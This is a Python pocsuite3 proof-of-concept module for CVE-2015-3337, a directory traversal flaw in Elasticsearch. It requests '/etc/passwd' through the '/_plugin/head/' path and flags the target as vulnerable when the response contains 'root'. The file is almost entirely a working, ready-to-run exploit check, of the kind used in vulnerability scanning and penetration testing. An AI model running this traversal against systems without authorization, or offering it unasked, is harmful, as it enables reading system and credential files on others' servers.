# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY,requests
from pocsuite3.lib.core.threads import run_threads


class ElasticsearchDirFlyPOC(POCBase):
    vulID = 'cve-2015-3337'
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 10, 2020'
    createDate = 'Aug 10, 2020'
    name = 'es目录穿越'
    appName = 'elasticsearch'
    appVersion = 'v1.0.0'
    vulType = '目录穿越'
    protocol = 'http'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        result = {}
        url = self.url
        if not url.startswith('http'):
            url = 'http://'+url
        try:
            res = requests.get(url+'/_plugin/head/../../../../../../../../../etc/passwd')
            if res.status_code == 200 and 'root' in res.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            logger.info(url+'\t'+str(e))
        
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

register_poc(ElasticsearchDirFlyPOC)